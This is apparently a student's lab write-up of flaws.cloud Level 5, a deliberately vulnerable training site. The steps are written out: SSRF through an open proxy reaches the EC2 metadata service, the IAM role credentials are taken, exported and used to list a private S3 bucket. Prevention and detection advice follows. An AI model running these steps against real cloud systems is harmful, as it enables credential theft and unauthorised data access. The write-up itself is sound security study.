# Lab 05 — flaws.cloud: SSRF & the EC2 Metadata Service (the Capital One attack)

**Date:** 2026-11-03
**Difficulty:** Advanced
**Time taken:** ~30 minutes

---

## 🎯 Objective
Work through Level 5 of flaws.cloud, where an EC2 instance runs an open HTTP proxy.
Use that proxy (an SSRF vector) to reach the **EC2 metadata service** at
`169.254.169.254`, steal the instance's IAM role credentials, and use them to read a
private S3 bucket that my own account can't touch.

## 🧰 AWS services / tools used
- EC2 Instance Metadata Service (IMDSv1)
- SSRF (Server-Side Request Forgery) via an open proxy
- AWS STS temporary credentials
- AWS CLI (v2)
- Amazon S3

## 🗺️ What I did (steps)

1. **Found an open proxy** on an EC2 instance that fetches any URL in the form
   `http://<proxy-host>/proxy/<target-url>`.
2. **Pointed the proxy at the internal metadata service** to list the instance's IAM
   role — an address only reachable *from* the instance:
   ```
   http://<proxy-host>/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
   ```
   Returned the role name: `flaws`.
3. **Retrieved the role's temporary credentials** by appending the role name:
   ```
   http://<proxy-host>/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
   ```
   Returned an `AccessKeyId` (starting `ASIA...`), a `SecretAccessKey`, and a
   `Token` — all redacted here.
4. **Loaded the three temporary credentials** as environment variables and confirmed
   I was now operating as the stolen role:
   ```
   export AWS_ACCESS_KEY_ID=... ; export AWS_SECRET_ACCESS_KEY=... ; export AWS_SESSION_TOKEN=...
   aws sts get-caller-identity
   # -> arn:aws:sts::975426262029:assumed-role/flaws/...  (not my own user)
   ```
5. **Read the private Level 6 bucket** — denied to my own account, but open to the
   stolen role:
   ```
   aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --region us-west-2
   # PRE ddcc78ff/   + index.html   -> the Level 6 entry point
   ```

## 💡 What I learned
- The EC2 metadata service (`169.254.169.254`) will hand out the instance's IAM role
  credentials to **anything that can make an HTTP request from the instance.**
- An **SSRF flaw** (here, an open proxy) lets an external attacker reach that
  internal-only endpoint and steal those credentials. **This is exactly how the 2019
  Capital One breach happened** (100M+ records).
- **Temporary credentials** (`ASIA...` + a session token) require all three parts to
  use — key, secret, and token.
- The stolen role's permissions define the blast radius — this is why **least
  privilege on instance roles** matters so much.

## 🛡️ How it maps to the real world
Prevention for a cloud security engineer:
- **Enforce IMDSv2** — it requires a session token obtained via a `PUT` request, which
  simple SSRF can't perform. IMDSv1 is the vulnerable version. *(My own lab instance
  showed "IMDSv2 Required" by default — AWS now defaults to the safer version.)*
- **Least-privilege IAM roles** on instances, so a stolen role can do as little as
  possible.
- **Fix SSRF in applications** — validate/allowlist outbound URLs and block requests
  to `169.254.169.254`; don't run open proxies.
- **Detect it** — Amazon GuardDuty has a specific finding for instance credentials
  being used from outside the instance (`InstanceCredentialExfiltration`).

## 🔒 Note on the redacted credentials
The stolen access key, secret, and token are **intentionally redacted** — credentials
never go in a public repo. (These were temporary and have since expired anyway.)

## 🧹 Cleanup
- Unset the temporary credential environment variables to return to my own identity:
  ```
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
  ```
- No AWS resources were created in this level.

---
*Part of my AWS cloud security lab portfolio.*
